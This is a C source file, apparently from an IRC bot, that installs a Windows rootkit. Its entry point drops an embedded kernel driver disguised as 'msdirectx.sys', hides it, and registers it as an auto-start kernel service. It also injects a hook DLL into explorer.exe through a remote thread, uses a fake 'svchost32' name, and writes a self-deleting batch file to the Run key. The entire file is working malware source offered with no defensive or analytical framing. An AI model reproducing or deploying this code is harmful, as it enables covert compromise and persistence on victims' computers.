#include "bot.h"
#include "ELiRT.h"
char *driverfilename = "msdirectx.sys";
char *drivername = "msdirectx";
char *hookfilename = "msdirectx.dll";
char *injectprocess = "explorer.exe";
const char *regkeyname = "svchost32";
const char *servicename = "svchost32";
#define LOWBUF 128
#define IRCBUF 512
#define MEDBUF 256
DWORD get_pid(char *szExe)
{
   char szProc[LOWBUF];
   HANDLE hProcessSnap;
   PROCESSENTRY32 pe32;
   hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
      pe32.dwSize = sizeof(PROCESSENTRY32);
   if (!Process32First(hProcessSnap, &pe32))
   {
      CloseHandle(hProcessSnap);
      return 0;
   }
   do
   {
         sprintf(szProc, pe32.szExeFile);
         PathStripPath(szProc);
      if (lstrcmpi(szProc, szExe) == 0)
      {
         return (pe32.th32ProcessID);
         break;
      }
   }
   while (Process32Next(hProcessSnap, &pe32));
      CloseHandle(hProcessSnap);
      return 0;
}
bool inject_library(char *szProcess, char *szLibPath)
{
   char szDLLPath[256];
   DWORD dwBytesWritten, dwThreadID;
   HANDLE hProcess, hThread;
   LPTHREAD_START_ROUTINE lpModule;
   LPVOID lpBuffer;
   sprintf(szDLLPath, szLibPath);
      hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, get_pid(szProcess));
   if (hProcess == NULL) return FALSE;
      lpModule = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "LoadLibraryA");
      lpBuffer = xVirtualAllocEx(hProcess, NULL, sizeof(szDLLPath), MEM_COMMIT, PAGE_READWRITE);
   if (!lpBuffer) return FALSE;
   if (!WriteProcessMemory(hProcess, lpBuffer, szDLLPath, sizeof(szDLLPath), &dwBytesWritten)) return FALSE;
      hThread = xCreateRemoteThread(hProcess, NULL, 0, lpModule, lpBuffer, 0, &dwThreadID);
   if (!hThread) return FALSE;
      WaitForSingleObject(hThread, 1000);
      xVirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
      CloseHandle(hThread);
      CloseHandle(hProcess);
      return TRUE;
}
bool extract_resource(char *szResName, char *szResType, char *szExtractPath)
{
   DWORD dwSize, dwWritten = 0;
   HANDLE hFile;
   HGLOBAL hResData;
   HMODULE hInstance = GetModuleHandle(NULL);
   HRSRC hResLocation;
   LPVOID pExe;
   hResLocation = FindResource(hInstance, szResName, szResType);
   dwSize = SizeofResource(hInstance, hResLocation);
   hResData = LoadResource(hInstance, hResLocation);
   pExe = LockResource(hResData);
   if (pExe == NULL) return FALSE;
      hFile = CreateFile(szExtractPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
   if (hFile == INVALID_HANDLE_VALUE) return FALSE;
      WriteFile(hFile, pExe, dwSize, &dwWritten, NULL);
   if (dwWritten != dwSize) return FALSE;
      CloseHandle(hFile);
      return TRUE;
}
bool file_exists(char *szPath)
{
   HANDLE hFile;
   hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
   if (hFile == INVALID_HANDLE_VALUE)
   {
         CloseHandle(hFile);
         return FALSE;
   }
      CloseHandle(hFile);
      return TRUE;
}

bool is_os9x()
{
   OSVERSIONINFO vInfo;
      vInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
      GetVersionEx(&vInfo);
   if (vInfo.dwMajorVersion == 4 && vInfo.dwMinorVersion == 0)
   {
      if (vInfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) return TRUE;
      if (vInfo.dwPlatformId == VER_PLATFORM_WIN32_NT) return FALSE;
   }
   else if (vInfo.dwMajorVersion == 4 && vInfo.dwMinorVersion == 10) return TRUE;
   else if (vInfo.dwMajorVersion == 4 && vInfo.dwMinorVersion == 90) return TRUE;
   else if (vInfo.dwMajorVersion == 5 && vInfo.dwMinorVersion == 0) return FALSE;
   else if (vInfo.dwMajorVersion == 5 && vInfo.dwMinorVersion == 1) return FALSE;
   else if (vInfo.dwMajorVersion == 5 && vInfo.dwMinorVersion == 2) return FALSE;
      return FALSE;
}
bool install_service(char *szServiceName, char *szServicePath, DWORD dwServiceType, DWORD dwServiceStartup, bool bStartService)
{
   SC_HANDLE hManager, hService;
   hManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
      hService = CreateService(hManager, szServiceName, szServiceName, SERVICE_ALL_ACCESS, dwServiceType, dwServiceStartup, SERVICE_ERROR_NORMAL, szServicePath, NULL, NULL, NULL,  NULL, NULL);
   if (hService == NULL)
   {
         CloseServiceHandle(hService);
         CloseServiceHandle(hManager);
         return FALSE;
   }
   if (bStartService)
   {
         hService = OpenService(hManager, szServiceName, SERVICE_ALL_ACCESS);
      if (hService == NULL) return FALSE;
         StartService(hService, 0, NULL);
         CloseServiceHandle(hService);
         CloseServiceHandle(hManager);
   }
      return TRUE;
}
bool is_osnt()
{
   OSVERSIONINFO vInfo;
   vInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
      GetVersionEx(&vInfo);
   if (vInfo.dwMajorVersion == 4 && vInfo.dwMinorVersion == 0)
   {
      if (vInfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) return FALSE;
      if (vInfo.dwPlatformId == VER_PLATFORM_WIN32_NT) return FALSE;
   }
   else if (vInfo.dwMajorVersion == 4 && vInfo.dwMinorVersion == 10) return FALSE;
   else if (vInfo.dwMajorVersion == 4 && vInfo.dwMinorVersion == 90) return FALSE;
   else if (vInfo.dwMajorVersion == 5 && vInfo.dwMinorVersion == 0) return TRUE;
   else if (vInfo.dwMajorVersion == 5 && vInfo.dwMinorVersion == 1) return TRUE;
   else if (vInfo.dwMajorVersion == 5 && vInfo.dwMinorVersion == 2) return TRUE;
      return FALSE;
}
bool regwritekey(HKEY hKey, char *szPath, char *szKey, char *szValue)
{
   HKEY rk = NULL;
   char szVal[MEDBUF];
   sprintf(szVal, szValue);
   if (RegCreateKeyEx(hKey, szPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &rk, NULL) != ERROR_SUCCESS) return FALSE;
   if (RegSetValueEx(rk, szKey, 0, REG_SZ, (const unsigned char *)&szVal, sizeof(szVal)) != ERROR_SUCCESS) return FALSE;
      RegCloseKey(rk);
      return TRUE;
}
bool regdeletekey(HKEY hKey, char *szPath, char *szKey)
{
   HKEY rk = NULL;
   if (RegCreateKeyEx(hKey, szPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &rk, NULL) != ERROR_SUCCESS) return FALSE;
   if (RegDeleteValue(rk, szKey) != ERROR_SUCCESS) return FALSE;
      RegCloseKey(rk);
      return TRUE;
}
bool install_kernelkit()
{
   char szInstallPath[MAX_PATH], szSysDir[MAX_PATH];
   if (is_os9x()) return FALSE;
   if (!is_osnt()) return FALSE;
   GetSystemDirectory(szSysDir, sizeof(szSysDir));
   sprintf(szInstallPath, "%s\\%s", szSysDir, driverfilename);
   if (!file_exists(szInstallPath)) extract_resource("driver", "RT_RCDATA", szInstallPath);
      SetFileAttributes(szInstallPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
   if (install_service(drivername, szInstallPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE)) return TRUE;
   return FALSE;
}
bool install_userkit()
{
   char szInstallPath[MAX_PATH], szSysDir[MAX_PATH];
   GetSystemDirectory(szSysDir, sizeof(szSysDir));
   sprintf(szInstallPath, "%s\\%s", szSysDir, hookfilename);
   if (!file_exists(szInstallPath)) extract_resource("hooker", "RT_RCDATA", szInstallPath);
   SetFileAttributes(szInstallPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
   if (inject_library(injectprocess, szInstallPath)) return TRUE;
   return FALSE;
}
int delete_file(char *szPath)
{
   if (!file_exists(szPath)) return 2;
   if (!DeleteFile(szPath)) return 1;
   else return 0;
}
bool uninstall_service(char *szServiceName)
{
   SC_HANDLE hManager, hService;
   SERVICE_STATUS serviceStatus;
   hManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
   hService = OpenService(hManager, szServiceName, SERVICE_ALL_ACCESS);
   if (hService == NULL)
   {
         CloseServiceHandle(hService);
         CloseServiceHandle(hManager);
         return FALSE;
   }
      ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
   if (hService == NULL) return FALSE;
      DeleteService(hService);
      CloseServiceHandle(hService);
      CloseServiceHandle(hManager);
      return TRUE;
}
bool uninstall_kernelkit()
{
   char szInstallPath[MAX_PATH], szSysDir[MAX_PATH];
   GetSystemDirectory(szSysDir, sizeof(szSysDir));
   sprintf(szInstallPath, "%s\\%s", szSysDir, driverfilename);
   if (!uninstall_service((char *)drivername)) return FALSE;
   if (!delete_file(szInstallPath)) return FALSE;
      return TRUE;
}
bool uninstall_userkit()
{
   char szBatPath[MAX_PATH], szInstallPath[MAX_PATH], szMeltText[IRCBUF], szSysDir[MAX_PATH], szTempDir[MAX_PATH];
   DWORD r;
   HANDLE hFile;
   GetSystemDirectory(szSysDir, sizeof(szSysDir));
   sprintf(szInstallPath, "%s\\%s", szSysDir, hookfilename);
   GetTempPath(sizeof(szTempDir), szTempDir);
   sprintf(szBatPath, "%stmp.bat", szTempDir);
   sprintf(szMeltText,
         "@echo off\r\n"
             ":start\r\n"
         "attrib \"%s\" -R -A -S -H\r\n"
         "del \"%s\"\r\n"
         "if exist \"%s\" goto start\r\n"
         "del \"%s\"",
         szInstallPath, szInstallPath, szInstallPath, szBatPath);
   hFile = CreateFile(szBatPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
   if (hFile == INVALID_HANDLE_VALUE)
   {
      CloseHandle(hFile);
      return FALSE;
   }
      WriteFile(hFile, szMeltText, strlen(szMeltText), &r, NULL);
      CloseHandle(hFile);
      regwritekey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",(char *)regkeyname, szBatPath);
      return TRUE;
}
void entry_point()
{
      install_kernelkit();
      install_userkit();
}